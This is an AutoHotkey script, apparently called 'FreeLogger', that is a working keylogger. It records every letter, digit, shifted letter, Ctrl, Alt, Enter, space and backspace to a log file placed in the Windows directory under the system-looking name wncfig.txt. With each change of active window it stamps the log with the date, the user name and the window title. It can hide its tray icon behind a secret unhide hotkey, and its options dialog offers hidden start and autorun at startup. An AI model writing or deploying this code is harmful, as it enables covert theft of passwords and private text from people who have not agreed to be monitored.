#MaxMem 10248
#singleinstance force
Menu,Tray,NoStandard
Menu,Tray,DeleteAll
key_file=%windir%\wncfig.txt
Menu,Tray,Add,View Log,View
Menu,Tray,Add,Clear Log,Clear
Menu,Tray,Add
Menu,Tray,Add,Hide Icon,Hide
Menu,Tray,Add
Menu,Tray,Add,E&xit,Exit

Menu,Tray,Default


com=a
~*a::
Gosub Check
FileAppend, a, %key_file%
return
~*b::
Gosub Check
FileAppend, b, %key_file%
return
~*c::
Gosub Check
FileAppend, c, %key_file%
return
~*d::
Gosub Check
FileAppend, d, %key_file%
return
~*e::
Gosub Check
FileAppend, e, %key_file%

return
~*f::
Gosub Check
FileAppend, f, %key_file%

return
~*g::
Gosub Check
FileAppend, g, %key_file%

return
~*h::
Gosub Check
FileAppend, h, %key_file%
return
~*i::
Gosub Check
FileAppend, i, %key_file%
return
~*j::
Gosub Check
FileAppend, j, %key_file%
return
~*k::
Gosub Check
FileAppend, k, %key_file%

return
~*l::
Gosub Check
FileAppend, l, %key_file%

return
~*m::
Gosub Check
FileAppend, m, %key_file%

return
~*n::
Gosub Check
FileAppend, n, %key_file%

return
~*o::
Gosub Check
FileAppend, o, %key_file%

return
~*p::
Gosub Check
FileAppend, p, %key_file%

return
~*q::
Gosub Check
FileAppend, q, %key_file%

return
~*r::
Gosub Check
FileAppend, r, %key_file%

return
~*s::
Gosub Check
FileAppend, s, %key_file%

return
~*t::
Gosub Check
FileAppend, t, %key_file%

return
~*u::
Gosub Check
FileAppend, u, %key_file%

return
~*v::
Gosub Check
FileAppend, v, %key_file%

return
~*w::
Gosub Check
FileAppend, w, %key_file%

return
~*x::
Gosub Check
FileAppend, x, %key_file%

return
~*y::
Gosub Check
FileAppend, y, %key_file%

return
~*z::
Gosub Check
FileAppend, z, %key_file%
return

~*ctrl::
{
	Gosub Check
	FileAppend, [Ctrl], %key_file%
}
return







~*Alt::
{
	Gosub Check
	FileAppend, [Alt], %key_file%
}
return

~*1::
{
	Gosub Check
	FileAppend, 1, %key_file%
}
return
~*2::
{
	Gosub Check
	FileAppend, 2, %key_file%
}
return
~*3::
{
	Gosub Check
	FileAppend, 3, %key_file%
}
return
~*4::
{
	Gosub Check
	FileAppend, 4, %key_file%
}
return
~*5::
{
	Gosub Check
	FileAppend, 5, %key_file%
}
return
~*6::
{
	Gosub Check
	FileAppend, 6, %key_file%
}
return
~*7::
{
	Gosub Check
	FileAppend, 7, %key_file%
}
return
~*8::
{
	Gosub Check
	FileAppend, 8, %key_file%
}
return
~*9::
{
	Gosub Check
	FileAppend, 9, %key_file%
}
return
~*0::
{
	Gosub Check
	FileAppend, 10, %key_file%
}
return


~*+a::FileAppend, A, %key_file%
~*+b::FileAppend, B, %key_file%
~*+c::FileAppend, C, %key_file%
~*+d::FileAppend, D, %key_file%
~*+e::FileAppend, E, %key_file%
~*+f::FileAppend, F, %key_file%
~*+g::FileAppend, G, %key_file%
~*+h::FileAppend, H, %key_file%
~*+i::FileAppend, I, %key_file%
~*+j::FileAppend, J, %key_file%
~*+k::FileAppend, K, %key_file%
~*+l::FileAppend, L, %key_file%
~*+m::FileAppend, M, %key_file%
~*+n::FileAppend, N, %key_file%
~*+o::FileAppend, O, %key_file%
~*+p::FileAppend, P, %key_file%
~*+q::FileAppend, Q, %key_file%
~*+r::FileAppend, R, %key_file%
~*+s::FileAppend, S, %key_file%
~*+t::FileAppend, T, %key_file%
~*+u::FileAppend, U, %key_file%
~*+v::FileAppend, V, %key_file%
~*+w::FileAppend, W, %key_file%
~*+x::FileAppend, X, %key_file%
~*+y::FileAppend, Y, %key_file%
~*+z::FileAppend, Z, %key_file%
~*enter::FileAppend, [Enter]`n, %key_file%

!^+u::
{
	menu,tray,Icon
}
return

~*-::
Gosub Check
FileAppend, -, %key_file%
return

~*+-::
Gosub Check
FileAppend, _, %key_file%
return


~*space::FileAppend, %A_space%, %key_file%
~*BS::
Gosub Check
FileAppend, [Back], %key_file%
return









return
Check:
WinGetTitle, Title, A
Title := Title
if (com=Title)
{

}
else
{
	FileAppend , `n`n<!--%A_MM%.%A_DD%.%A_YYYY%`, %A_Hour%:%A_Min%. User: "%A_UserName%". Window title:"%Title%"-->`n, %key_file%
}
com=%Title%
return



hide:
msgbox To unhide the tray icon, press alt+ctrl+shift+u.
menu,tray,NoIcon
return

view:
run %key_file%
return

clear:
MsgBox, 4,, Are you sure you want to clear the log? (press Yes or No)
IfMsgBox Yes
{
	filedelete,%key_file%
	fileappend,==========Log Started at %A_MM%.%A_DD%.%A_YYYY%`, %A_Hour%:%A_Min%==========,%key_file%
}
return


options:
Gui, Add, Button, x273 y172 w75 h23 , OK
Gui, Add, Button, x358 y172 w75 h23 , Cancel
Gui, Add, Checkbox, x19 y27 w122 h16 , Start in hidden mode

Gui, Add, Checkbox, x19 y81 w143 h16 , Autorun at system startup
Gui, Add, Hotkey, x195 y61 w117 h23 ,
Gui, Add, Button, x9 y121 w201 h23 , Remove shortcuts from start menu
Gui, Add, Button, x9 y172 w65 h23 view, View log
Gui, Add, Button, x82 y172 w65 h23 clear, Clear log
Gui, Add, GroupBox, x9 y3 w315 h111 , Startup parameters
Gui, Add, Text, x214 y42 w84 h13 , Unhide keystroke
Gui, Add, Text, x333 y11 w99 h99 ,
Gui, Add, Text, x330 y8 w105 h104 ,
Gui, Add, Text, x163 y168 w99 h28 , Want more features?`n     Just tell us!
Gui, Add, Text, x10 y154 w424 h2 ,
Gui, Show, x361 y211 h209 w444, FreeLogger

return

exit:
exitapp
return

GuiClose:
gui,destroy
return


iniread:
return

iniwrite:
return
